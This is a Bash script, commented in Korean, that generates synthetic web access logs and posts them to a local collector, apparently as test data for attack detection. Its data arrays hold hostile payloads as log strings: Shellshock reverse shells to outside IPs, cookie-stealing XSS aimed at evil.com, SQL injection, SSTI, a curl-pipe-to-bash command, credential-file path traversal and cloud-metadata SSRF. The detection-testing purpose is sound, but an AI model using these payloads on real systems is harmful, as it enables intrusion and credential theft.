#!/bin/bash
TARGET="http://localhost:8081/logs"

# 목적지 IP (고정)
VICTIM_IPS=("10.100.0.195" "10.100.0.196")

# 출발지 IP (다양하게)
SRC_IPS=(
  "192.168.1.10" "192.168.1.23" "192.168.1.45" "192.168.1.67" "192.168.1.88"
  "192.168.0.5"  "192.168.0.31" "192.168.0.77" "192.168.0.102"
  "10.0.0.14"    "10.0.0.33"    "10.0.0.55"    "10.0.0.78"    "10.0.0.99"
  "172.16.0.8"   "172.16.0.22"  "172.16.1.5"   "172.16.2.11"
  "203.0.113.4"  "203.0.113.17" "203.0.113.45" "203.0.113.99"
  "198.51.100.3" "198.51.100.12" "198.51.100.67"
  "185.220.101.1" "185.220.101.47" "185.220.101.89"
  "45.33.32.156" "45.33.32.200" "45.142.212.33"
  "104.21.45.67" "104.21.100.5"
  "151.101.1.200" "151.101.65.4"
  "91.108.4.15"  "77.88.55.60"  "8.8.4.4"
  "1.1.1.1"      "9.9.9.9"
)

# 정상 UA
NORMAL_UAS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
  "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/113.0 Firefox/113.0"
  "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
  "curl/7.88.1" "curl/7.81.0" "curl/8.0.1"
  "python-requests/2.31.0" "python-requests/2.28.2"
  "Go-http-client/1.1" "Go-http-client/2.0"
  "Java/11.0.19" "Java/17.0.7" "Java/1.8.0_345"
  "okhttp/4.11.0" "okhttp/3.14.9"
  "Wget/1.21.3" "Wget/1.20.3"
  "Apache-HttpClient/4.5.14" "Apache-HttpClient/5.2.1"
  "axios/1.4.0" "node-fetch/3.3.2"
)

# 스캐너 UA
SCANNER_UAS=(
  "Nmap Scripting Engine; https://nmap.org/book/nse.html"
  "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)"
  "zgrab/0.x"
  "nuclei/2.9.6 (https://nuclei.projectdiscovery.io)"
  "nuclei/3.1.0"
  "sqlmap/1.7.8#stable (https://sqlmap.org)"
  "sqlmap/1.6.12#stable"
  "nikto/2.1.6"
  "dirbuster/1.0-RC1"
  "gobuster/3.6"
  "feroxbuster/2.10.0"
  "ffuf/2.1.0"
  "wfuzz/3.1.0"
  "Acunetix/14.0"
  "OpenVAS/21.4.4"
  "WPScan v3.8.22"
  "Burp Suite Community Edition"
  "Burp Collaborator"
  "OWASP ZAP/2.14.0"
  "Metasploit/6.3.0 (https://metasploit.com)"
  "Havij v1.17 Free"
  "python-httpx/0.24.1"
  "aiohttp/3.8.5"
  "Scrapy/2.11.0"
  "HTTPie/3.2.2"
  "curl/7.29.0 (vuln-scan)"
)

# 공격 UA
ATTACK_UAS=(
  "() { :;}; /bin/bash -i >& /dev/tcp/185.220.101.47/4444 0>&1"
  "() { ignored; }; /bin/bash -i >& /dev/tcp/45.33.32.156/9001 0>&1"
  "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
  "<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>"
  "Mozilla/5.0 ${7*7} AppleWebKit"
  "Mozilla/5.0 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
  "python-requests/2.28.0 CVE-2023-32681"
  "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
  "python/3.11 exploit-kit/2.0"
  "zgrab/0.x (go1.20; linux/amd64)"
)

# 정상 경로
NORMAL_PATHS=(
  "/shop" "/shop/" "/shop/index"
  "/shop/product/1" "/shop/product/2" "/shop/product/15" "/shop/product/99"
  "/shop/product?id=1" "/shop/product?id=2" "/shop/product?category=electronics"
  "/shop/cart" "/shop/cart/add" "/shop/cart/remove"
  "/shop/checkout" "/shop/checkout/confirm" "/shop/order/success"
  "/api/v1/users" "/api/v1/users/1" "/api/v1/users/profile"
  "/api/v1/products" "/api/v1/products/list" "/api/v1/products/search"
  "/api/v2/orders" "/api/v2/orders/1234" "/api/v2/payment"
  "/login" "/logout" "/register" "/forgot-password" "/reset-password"
  "/profile" "/profile/edit" "/profile/settings"
  "/static/js/main.js" "/static/css/style.css" "/static/img/logo.png"
  "/favicon.ico" "/robots.txt" "/sitemap.xml"
  "/health" "/ping" "/status"
)

# SQLi 경로
SQLI_PATHS=(
  "/shop?id=1' OR '1'='1"
  "/shop?id=1 UNION SELECT 1,2,3,4,5--"
  "/shop?id=1; DROP TABLE users--"
  "/login?user=admin'--&pass=anything"
  "/login?user=admin'/*&pass=*/"
  "/search?q=1' AND SLEEP(5)--"
  "/api/v1/products?filter=1' OR 1=1#"
  "/shop?category=1' ORDER BY 10--"
  "/api/orders?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
  "/api/v1/users?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
  "/shop?id=1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
  "/api/search?q=' OR 1=1 LIMIT 1--"
  "/user?name=admin' AND 1=2 UNION SELECT username,password FROM users--"
  "/api/v1/login' OR 'x'='x"
  "/product?sku=ABC'; INSERT INTO logs VALUES('pwned')--"
  "/api/filter?type=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
  "/shop?sort=name ASC; EXEC xp_cmdshell('whoami')--"
  "/api/v2/items?page=1' WAITFOR DELAY '0:0:5'--"
)

# XSS 경로
XSS_PATHS=(
  "/search?q=<script>alert(1)</script>"
  "/shop?name=<img src=x onerror=alert(document.cookie)>"
  "/comment?text=<svg onload=fetch('http://evil.com/?c='+document.cookie)>"
  "/profile?bio=javascript:alert(document.domain)"
  "/api/v1/users?name=<iframe src='http://evil.com'>"
  "/search?q=<script>document.write('<img src=http://evil.com/?c='+document.cookie+'>')</script>"
  "/feedback?msg=<body onload=alert('XSS')>"
  "/shop?ref=<script>new Image().src='http://evil.com/steal.php?c='+encodeURIComponent(document.cookie)</script>"
  "/api/notify?msg=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
  "/user/search?term=\"><script>alert(String.fromCharCode(88,83,83))</script>"
  "/api/v1/comment?text=<details open ontoggle=alert(1)>"
  "/shop?redirect=javascript:eval(atob('YWxlcnQoMSk='))"
)

# LFI/RFI/경로탐색
LFI_PATHS=(
  "/../../../etc/passwd"
  "/download?file=../../etc/shadow"
  "/api/file?path=/proc/self/environ"
  "/view?page=../../../../windows/win.ini"
  "/include?url=http://evil.com/shell.php"
  "/api/read?path=....//....//etc/passwd"
  "/static/../../../etc/hosts"
  "/download?f=....%2F....%2F....%2Fetc%2Fpasswd"
  "/api/v1/export?path=/etc/passwd%00.pdf"
  "/view?template=../../../../../etc/mysql/my.cnf"
  "/.git/config"
  "/.env"
  "/.aws/credentials"
  "/.ssh/id_rsa"
  "/backup.zip" "/db.sql" "/dump.sql"
  "/api/v1/file?name=../../../app/config/database.yml"
  "/wp-config.php" "/config.php" "/settings.php"
  "/proc/self/cmdline" "/proc/self/fd/0"
)

# 커맨드 인젝션 / SSTI
CMDI_PATHS=(
  "/api/ping?host=127.0.0.1;id"
  "/api/exec?cmd=cat+/etc/passwd"
  "/search?q={{7*7}}"
  "/template?name=\${7*7}"
  "/api/convert?file=test.pdf;ls+-la"
  "/ping?ip=127.0.0.1|whoami"
  "/api/lookup?domain=evil.com\`id\`"
  "/api/dns?host=;cat /etc/passwd"
  "/api/report?name={{config.__class__.__init__.__globals__}}"
  "/render?tmpl={% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__ == 'Popen' %}{{ x(['id'],stdout=-1).communicate() }}{% endif %}{% endfor %}"
  "/api/v1/process?input=\$(curl http://evil.com/shell.sh|bash)"
  "/convert?src=http://169.254.169.254/latest/meta-data/"
  "/api/webhook?url=file:///etc/passwd"
  "/fetch?url=dict://localhost:6379/info"
  "/proxy?target=http://internal-service:8080/admin"
)

# SSRF
SSRF_PATHS=(
  "/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "/api/proxy?target=http://localhost:8080/actuator/env"
  "/webhook?url=http://internal:9200/_cat/indices"
  "/api/request?endpoint=http://redis:6379"
  "/image?url=http://169.254.169.254/latest/user-data"
  "/api/v1/import?source=http://10.0.0.1:2375/v1.24/containers/json"
  "/render?url=http://metadata.google.internal/computeMetadata/v1/"
  "/api/check?host=http://172.17.0.1:2376/containers/json"
)

# 알려진 취약점 탐색
CVE_PATHS=(
  "/struts2-blank/example/HelloWorld.action"
  "/webtools/control/main;jsessionid=x"
  "/invoker/EJBInvokerServlet"
  "/manager/html"
  "/console"
  "/jmx-console"
  "/actuator/health" "/actuator/env" "/actuator/beans" "/actuator/heapdump"
  "/solr/admin/info/system"
  "/api/jolokia/read/java.lang:type=Memory"
  "/_cat/indices" "/_cluster/health"
  "/wp-admin/admin-ajax.php"
  "/wp-json/wp/v2/users"
  "/?XDEBUG_SESSION_START=phpstorm"
  "/api/v1/namespaces/default/secrets"
  "/.well-known/security.txt"
  "/cgi-bin/test.cgi"
  "/cgi-bin/../../../../bin/sh"
  "/api/swagger.json" "/swagger-ui.html" "/v2/api-docs"
  "/graphql" "/graphql?query={__schema{types{name}}}"
)

# Referer 풀
REFERERS=(
  "-"
  "http://10.100.0.195/shop"
  "http://10.100.0.196/shop"
  "http://10.100.0.195/login"
  "http://google.com/"
  "http://naver.com/"
  "http://10.100.0.195/admin"
  "http://evil.com/attack"
  "http://185.220.101.47/payload"
  "https://portswigger.net/"
  "-"  "-"  "-"
)

HTTP_METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD" "TRACE")

rand_elem() {
  local arr=("$@")
  echo "${arr[$((RANDOM % ${#arr[@]}))]}"
}

rand_ts() {
  local offset=$((RANDOM % 43200))
  date -d "-${offset} seconds" "+%d/%b/%Y:%H:%M:%S +0900" 2>/dev/null || \
  echo "$(date '+%d/%b/%Y:%H:%M:%S') +0900"
}

rand_bytes() {
  echo $((RANDOM % 65535 + 100))
}

rand_victim() {
  echo "${VICTIM_IPS[$((RANDOM % 2))]}"
}

send_nginx() {
  local ip="$1" ts="$2" method="$3" path="$4" status="$5" bytes="$6" referer="$7" ua="$8"
  local log="${ip} - - [${ts}] \"${method} ${path} HTTP/1.1\" ${status} ${bytes} \"${referer}\" \"${ua}\""
  curl -s -X POST "$TARGET" -H "Content-Type: text/plain" -d "$log" > /dev/null
}

send_json() {
  local ip="$1" ts="$2" method="$3" path="$4" status="$5" ua="$6" referer="$7"
  curl -s -X POST "$TARGET" -H "Content-Type: application/json" \
    -d "{\"time\":\"${ts}\",\"ip\":\"${ip}\",\"method\":\"${method}\",\"path\":\"${path}\",\"status\":\"${status}\",\"ua\":\"${ua}\",\"referer\":\"${referer}\"}" \
    > /dev/null
}

echo "[*] 노이즈 로그 생성 시작 (DIP: 10.100.0.195 / 10.100.0.196)"
echo "[*] Ctrl+C로 중지"

COUNT=0

while true; do

  # 1. 정상 트래픽 (40%)
  for i in $(seq 1 5); do
    ip=$(rand_elem "${SRC_IPS[@]}")
    ts=$(rand_ts)
    method=$(rand_elem "GET" "GET" "GET" "POST" "POST")
    path=$(rand_elem "${NORMAL_PATHS[@]}")
    status=$(rand_elem "200" "200" "200" "200" "301" "302" "304")
    bytes=$(rand_bytes)
    ua=$(rand_elem "${NORMAL_UAS[@]}")
    ref=$(rand_elem "${REFERERS[@]}")
    send_nginx "$ip" "$ts" "$method" "$path" "$status" "$bytes" "$ref" "$ua"
  done

  # 2. 스캐너 (8%)
  ip=$(rand_elem "${SRC_IPS[@]}")
  ts=$(rand_ts)
  path=$(rand_elem "${CVE_PATHS[@]}")
  status=$(rand_elem "403" "404" "200" "500")
  ua=$(rand_elem "${SCANNER_UAS[@]}")
  send_nginx "$ip" "$ts" "GET" "$path" "$status" "$(rand_bytes)" "-" "$ua"

  # 3. SQLi (15%)
  for i in $(seq 1 2); do
    ip=$(rand_elem "${SRC_IPS[@]}")
    ts=$(rand_ts)
    path=$(rand_elem "${SQLI_PATHS[@]}")
    status=$(rand_elem "200" "400" "500" "403")
    ua=$(rand_elem "${SCANNER_UAS[@]}" "${ATTACK_UAS[@]}")
    send_nginx "$ip" "$ts" "GET" "$path" "$status" "$(rand_bytes)" "-" "$ua"
  done

  # 4. XSS (10%)
  ip=$(rand_elem "${SRC_IPS[@]}")
  ts=$(rand_ts)
  path=$(rand_elem "${XSS_PATHS[@]}")
  status=$(rand_elem "200" "400" "403")
  ua=$(rand_elem "${NORMAL_UAS[@]}" "${ATTACK_UAS[@]}")
  send_nginx "$ip" "$ts" "POST" "$path" "$status" "$(rand_bytes)" "http://10.100.0.195/shop" "$ua"

  # 5. LFI/경로탐색 (10%)
  ip=$(rand_elem "${SRC_IPS[@]}")
  ts=$(rand_ts)
  path=$(rand_elem "${LFI_PATHS[@]}")
  status=$(rand_elem "200" "403" "404" "500")
  ua=$(rand_elem "${SCANNER_UAS[@]}")
  send_nginx "$ip" "$ts" "GET" "$path" "$status" "$(rand_bytes)" "-" "$ua"

  # 6. 커맨드 인젝션 / SSTI (8%)
  ip=$(rand_elem "${SRC_IPS[@]}")
  ts=$(rand_ts)
  path=$(rand_elem "${CMDI_PATHS[@]}")
  status=$(rand_elem "200" "400" "500")
  ua=$(rand_elem "${ATTACK_UAS[@]}" "${SCANNER_UAS[@]}")
  send_nginx "$ip" "$ts" "GET" "$path" "$status" "$(rand_bytes)" "-" "$ua"

  # 7. SSRF (5%)
  ip=$(rand_elem "${SRC_IPS[@]}")
  ts=$(rand_ts)
  path=$(rand_elem "${SSRF_PATHS[@]}")
  status=$(rand_elem "200" "403" "500" "400")
  ua=$(rand_elem "${SCANNER_UAS[@]}" "${NORMAL_UAS[@]}")
  send_nginx "$ip" "$ts" "GET" "$path" "$status" "$(rand_bytes)" "-" "$ua"

  # 8. 브루트포스 (4%)
  for i in $(seq 1 3); do
    ip=$(rand_elem "${SRC_IPS[@]}")
    ts=$(rand_ts)
    path=$(rand_elem "/login" "/admin/login" "/api/auth" "/api/v1/login")
    status=$(rand_elem "401" "401" "401" "403" "200")
    ua=$(rand_elem "${NORMAL_UAS[@]}")
    send_nginx "$ip" "$ts" "POST" "$path" "$status" "$(rand_bytes)" "http://10.100.0.195/login" "$ua"
  done

  # 9. JSON 포맷 (5%)
  ip=$(rand_elem "${SRC_IPS[@]}")
  ts=$(date -Iseconds)
  method=$(rand_elem "${HTTP_METHODS[@]}")
  path=$(rand_elem "${NORMAL_PATHS[@]}" "${CVE_PATHS[@]}" "${SQLI_PATHS[@]}")
  status=$(rand_elem "200" "400" "403" "404" "500")
  ua=$(rand_elem "${NORMAL_UAS[@]}" "${SCANNER_UAS[@]}" "${ATTACK_UAS[@]}")
  ref=$(rand_elem "${REFERERS[@]}")
  send_json "$ip" "$ts" "$method" "$path" "$status" "$ua" "$ref"

  COUNT=$((COUNT + 18))
  echo -ne "\r[*] 전송: ${COUNT}건"
  sleep 0.3
done
